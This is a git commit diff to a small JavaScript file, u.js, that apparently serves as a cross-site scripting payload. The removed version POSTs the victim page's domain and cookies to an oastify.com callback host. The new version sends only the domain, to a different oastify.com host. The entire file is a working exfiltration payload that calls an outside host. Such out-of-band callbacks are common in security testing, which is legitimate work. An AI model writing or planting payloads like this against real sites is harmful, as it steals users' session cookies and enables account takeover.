e5ec29ea715e6945c92e44e621df36fbdd7d9c2e
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2023-04-13 23:39:13 +0330

    Update u.js

--- u.js
+++ u.js
@@ -1,6 +1,6 @@
-fetch('https://fj23ivvlkop85cdl2kphnie2zt5jt8.oastify.com', {
+fetch('https://gwgqm2c4xss1lx80xtf48q54lvrmfb.oastify.com', {
 method: 'POST',
 mode: 'no-cors',
-body:document.domain+document.cookie
+body:document.domain
 });
 
